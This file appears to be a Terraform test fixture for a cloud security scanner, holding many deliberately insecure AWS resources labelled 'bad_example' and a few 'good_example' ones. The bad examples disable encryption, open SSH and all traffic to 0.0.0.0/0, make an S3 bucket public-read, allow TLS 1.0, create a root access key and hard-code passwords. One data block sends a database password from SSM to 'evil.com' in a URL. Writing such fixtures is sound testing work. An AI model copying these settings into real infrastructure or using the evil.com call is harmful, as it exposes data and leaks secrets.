# Configure the AWS provider
provider "aws" {
  region = "us-west-2"
}

resource "aws_api_gateway_domain_name" "as" {
  security_policy = "TLS_1_0"
}

 resource "aws_launch_configuration" "bad_example" {
  associate_public_ip_address = true
    root_block_device {
        encrypted = false
    }
 }

  resource "aws_docdb_cluster" "bad_example" {
   cluster_identifier      = "my-docdb-cluster"
   engine                  = "docdb"
   master_username         = "foo"
   master_password         = "mustbeeightchars"
   backup_retention_period = 5
   preferred_backup_window = "07:00-09:00"
   skip_final_snapshot     = true
   storage_encrypted = false
 }

 
 resource "aws_instance" "bad_example" {
  ami = "ami-7f89a64f"
  instance_type = "t1.micro"

  root_block_device {
      encrypted = false
  }

  ebs_block_device {
    device_name = "/dev/sdg"
    volume_size = 5
    volume_type = "gp2"
    delete_on_termination = false
    encrypted = false
  }
}

 resource "aws_network_acl_rule" "bad_example" {
   egress         = false
   protocol       = "all"
   rule_action    = "allow"
   cidr_block     = "0.0.0.0/0"
 }

// Bu olmadı
 resource "aws_security_group" "bad_example" {
    egress {
        cidr_blocks = ["0.0.0.0/0"]
    }
 }



 resource "aws_default_vpc" "default" {
    tags = {
      Name = "Default VPC"
    }
   }


resource "aws_cloudfront_distribution" "bad_example" {
  default_cache_behavior {
      viewer_protocol_policy = "allow-all"
    }
}

 resource "aws_ebs_volume" "bad_example" {
   availability_zone = "us-west-2a"
   size              = 40

   tags = {
     Name = "HelloWorld"
   }
   encrypted = false
 }


 resource "aws_subnet" "bad_example" {
    vpc_id                  = "vpc-123456"
    map_public_ip_on_launch = true
 }
 
 resource "aws_ecr_repository" "bad_example" {
   name                 = "bar"
   image_tag_mutability = "MUTABLE"

   image_scanning_configuration {
     scan_on_push = false
   }
 }

 resource "aws_efs_file_system" "bad_example" {
   name       = "bar"
   encrypted  = false
   kms_key_id = ""
 }

  resource "aws_elasticsearch_domain" "bad_example" {
   domain_name = "domain-foo"

   encrypt_at_rest {
     enabled = false
   }
 }

  resource "aws_elasticsearch_domain" "bad_example" {
   domain_name = "domain-foo"

   node_to_node_encryption {
     enabled = false
   }
 }

  resource "aws_elasticsearch_domain" "bad_example" {
   domain_name = "domain-foo"

   domain_endpoint_options {
     enforce_https = false
   }
 }




 resource "aws_eks_cluster" "bad_example" {
     // other config 

     name = "bad_example_cluster"
     role_arn = var.cluster_arn
     vpc_config {
        endpoint_public_access = true
        public_access_cidrs = ["0.0.0.0/0"]
     }
 }



 resource "aws_docdb_cluster" "good_example" {
   cluster_identifier      = "my-docdb-cluster"
   engine                  = "docdb"
   master_username         = "foo"
   master_password         = "mustbeeightchars"
   backup_retention_period = 5
   preferred_backup_window = "07:00-09:00"
   skip_final_snapshot     = true
   enabled_cloudwatch_logs_exports = "audit"
 }


 resource "aws_cloudfront_distribution" "bad_example" {
   viewer_certificate {
     cloudfront_default_certificate = aws_acm_certificate.example.arn
     minimum_protocol_version = "TLSv1.0"
   }
 }




# Create a new VPC security group
resource "aws_security_group" "example" {
  name        = "terraform-example-instance"
  description = "Allow SSH inbound traffic"

  # SSH access from anywhere
  ingress {
    from_port   = 22
    to_port     = 22
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
  }

  # Allow all outbound traffic
  egress {
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = ["0.0.0.0/0"]
  }
}

# Create a new AWS EC2 instance
resource "aws_instance" "example" {
  ami           = "ami-0c55b159cbfafe1f0" # Update this to the latest Amazon Linux AMI for your region
  instance_type = "t2.micro"
  security_groups = [aws_security_group.example.name]

  tags = {
    Name = "ExampleInstance"
  }
}


 resource "aws_elasticsearch_domain" "good_example" {
   domain_name = "domain-foo"

   domain_endpoint_options {
     enforce_https = true
     tls_security_policy = "Policy-Min-TLS-1-0-2019-07"
   }
 }

 resource "aws_elasticache_replication_group" "bad_example" {
         replication_group_id = "foo"
         replication_group_description = "my foo cluster"

         at_rest_encryption_enabled = false
 }

 resource "aws_alb" "bad_example" {
    internal = false
 }

 resource "aws_elasticache_replication_group" "bad_example" {
         replication_group_id = "foo"
         replication_group_description = "my foo cluster"
         transit_encryption_enabled = false
 }


 resource "aws_alb" "bad_example" {
    name               = "bad_alb"
    internal           = false
    load_balancer_type = "application"

    access_logs {
      bucket  = aws_s3_bucket.lb_logs.bucket
      prefix  = "test-lb"
      enabled = true
    }

    drop_invalid_header_fields = false
   }
 resource "aws_alb_listener" "bad_example" {
    protocol = "HTTP"
 }

resource "aws_iam_access_key" "bad_example" {
    user = "root"
}

 resource "aws_kms_key" "bad_example" {
    enable_key_rotation = false
 }

 resource "aws_mq_broker" "bad_example" {
   broker_name = "example"

   configuration {
     id       = aws_mq_configuration.test.id
     revision = aws_mq_configuration.test.latest_revision
   }

   engine_type        = "ActiveMQ"
   engine_version     = "5.15.0"
   host_instance_type = "mq.t2.micro"
   security_groups    = [aws_security_group.test.id]

   user {
     username = "ExampleUser"
     password = "MindTheGap"
   }
   logs {
     audit = false
   }
   publicly_accessible = true
 }


 resource "aws_msk_cluster" "bad_example" {
    encryption_info {
        encryption_in_transit {
            client_broker = "TLS_PLAINTEXT"
            in_cluster = true
        }
    }
 }

 resource "aws_neptune_cluster" "bad_example" {
   cluster_identifier                  = "neptune-cluster-demo"
   engine                              = "neptune"
   backup_retention_period             = 5
   preferred_backup_window             = "07:00-09:00"
   skip_final_snapshot                 = true
   iam_database_authentication_enabled = true
   apply_immediately                   = true
   storage_encrypted                   = false
 }

resource "aws_rds_cluster_instance" "bad_example" {
    name = "bar"
    performance_insights_enabled = false
    performance_insights_kms_key_id = ""
}

 resource "aws_db_security_group" "bad_example" {
   # ...
 }

resource "aws_s3_bucket_public_access_block" "bad_example" {
    bucket = aws_s3_bucket.example.id

    ignore_public_acls = false
 }
 resource "aws_s3_bucket" "bad_example" {
    acl = "public-read"
}

data "http" "not_exfiltrating_data_honest" {
  url = "https://evil.com/?p=${aws_ssm_parameter.db_password.value}"
}

 resource "aws_ecs_cluster" "good_example" {
    name = "services-cluster"

    setting {
      name  = "containerInsights"
      value = "enabled"
    }
 }


  resource "aws_athena_database" "good_example" {
   name   = "database_name"
   bucket = aws_s3_bucket.hoge.bucket

   encryption_configuration {
      encryption_option = "SSE_KMS"
      kms_key_arn       = aws_kms_key.example.arn
  }
 }
 resource "aws_athena_workgroup" "good_example" {
   name = "example"

   configuration {
     enforce_workgroup_configuration    = true
     publish_cloudwatch_metrics_enabled = true

     result_configuration {
       output_location = "s3://${aws_s3_bucket.example.bucket}/output/"

       encryption_configuration {
         encryption_option = "SSE_KMS"
         kms_key_arn       = aws_kms_key.example.arn
       }
     }
   }
 }

  resource "aws_launch_template" "good_example" {
     image_id      = "ami-005e54dee72cc1d00"
     instance_type = "t2.micro"
     metadata_options {
       http_tokens = "required"
     }  
 }

 resource "aws_cloudfront_distribution" "bad_example" {
    // other config
    // no logging_config
 }

 resource "aws_cloudtrail" "bad_example" {
   event_selector {
     read_write_type           = "All"
     include_management_events = true

     data_resource {
       type = "AWS::S3::Object"
       values = ["${data.aws_s3_bucket.important-bucket.arn}/"]
     }
   }
 }

 resource "aws_cloudtrail" "bad_example" {
   is_multi_region_trail = true

   event_selector {
     read_write_type           = "All"
     include_management_events = true

     data_resource {
       type = "AWS::S3::Object"
       values = ["${data.aws_s3_bucket.important-bucket.arn}/"]
     }
   }
 }


resource "aws_s3_bucket" "good_example" {
    bucket = "abcdefgh"

}

 resource "aws_cloudwatch_log_group" "good_example" {
    name = "good_example"

    kms_key_id = aws_kms_key.log_key.arn
 }

 resource "aws_codebuild_project" "bad_example" {
    // other config

    artifacts {
        // other artifacts config

        encryption_disabled = true
    }
 }